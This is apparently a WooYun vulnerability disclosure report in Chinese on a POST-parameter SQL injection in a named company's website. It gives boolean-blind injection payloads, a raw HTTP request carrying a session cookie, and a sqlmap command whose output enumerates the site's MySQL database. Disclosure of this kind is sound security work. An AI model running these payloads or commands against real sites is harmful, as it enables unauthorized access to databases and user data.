wybug_detail: 漏洞详情 披露状态：   									2015-11-27：	细节已通知厂商并且等待厂商处理中									2015-11-27：	厂商已经确认，细节仅向厂商公开									2015-12-07：	细节向核心白帽子及相关领域专家公开									2015-12-17：	细节向普通白帽子公开									2015-12-27：	细节向实习白帽子公开									2016-01-11：	细节向公众公开  简要描述： 主站的一个post注入 详细说明：  注入   漏洞证明：  网址:http://www.shanlinjinrong.com/include/wangdianfuwu.phppost关键字：type=xindai对网址进行一个简单的注入测试先xindai' AND 2+1-1-1=0+0+0+1 AND '000PLLK'='000PLLK  返回数据xindai' AND 3+1-1-1=0+0+0+1 AND '000PLLK'='000PLLK  返回空数据看一下返回值RequestPOST /include/wangdianfuwu.php HTTP/1.1Content-Length: 59Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.shanlinjinrong.com:80/Cookie: PHPSESSID=480u7rmjfgpv9hnj8gb0gd2mp5; OrdersId=7c70VAZVVQYFBQIAAAtRWAVdAFsFU1YHDFcIXAZjTzNVBwBcBlNXBg0MYH4EDFE; CNZZDATA1252973497=493273304-1448057382-http%253A%252F%252Fwww.acunetix-referrer.com%252F%7C1448057382Host: www.shanlinjinrong.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*type=xindai'%20AND%203*2*1%3d6%20AND%20'000PLLK'%3d'000PLLKResponseHTTP/1.1 200 OKServer: shanlinjinrong/webserviceDate: Fri, 20 Nov 2015 23:34:33 GMTContent-Type: text/html; charset=utf-8Connection: keep-aliveVary: Accept-EncodingVary: Accept-EncodingX-Powered-By: PHP/5.3.3Original-Content-Encoding: gzipContent-Length: 10962然后我们拿神器跑一下G:\sqlmap\0.9>sqlmap.py -u http://www.shanlinjinrong.com/include/wangdianfuwu.php --data type=xindai --threads 10 --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20141227}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 07:41:36[07:41:36] [INFO] resuming back-end DBMS 'mysql'[07:41:36] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: type (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=xindai' AND 7684=7684 AND 'OPXA'='OPXA---[07:41:37] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.3back-end DBMS: MySQL 5列表available databases [1]:[*] shanlin   修复方案：  过滤   版权声明：转载请注明来源 我爱，你老婆@乌云
